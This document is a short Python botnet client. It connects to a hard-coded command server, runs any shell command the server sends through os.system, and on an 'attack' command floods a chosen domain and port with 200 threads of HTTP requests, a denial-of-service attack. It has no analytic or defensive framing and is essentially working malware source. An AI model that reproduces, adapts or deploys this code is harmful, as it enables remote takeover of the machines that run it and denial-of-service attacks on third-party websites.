import socket, threading, os, time, requests

ADDRESS = "0.0.0.0"
DEFAULT_WORKERS = 100
connection_reset = 5
THREADS = []
is_https = False
gogo = True

def sendReq(url):
    requests.get(
        url = url,
        verify=False
    )

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ADDRESS, 46134))
        connected = True
        break
    except:
        print(f'Failed to connect to server retrying in {connection_reset} seconds')
        time.sleep(int(connection_reset))

while True and s:
    try:
        try:
            data = s.recv(128)
            data = data.decode('utf-8').replace("\r\n", "")
        except:
            pass

        if data.startswith("system"): os.system(data.replace("system ", ""))

        if data.startswith("attack"):
            try:
                domain = data.split(" ")[1]
                is_https = True if "https" in domain else False
                port = 80 if len(data.split(" ")) < 3 and not is_https else 443 if len(data.split(" ")) < 3 and is_https else data.split(" ")[2]

                for _ in range(200):
                    threading.Thread(
                        target = requests.get,
                        args = (f"http://{domain}:{port}" if not is_https else f"https://{domain}:{port}", )
                    ).start()

            except:
                pass

        if data.startswith("print"): print(data.replace("print ", ""))
    except:
        print('ERROR')

s.close()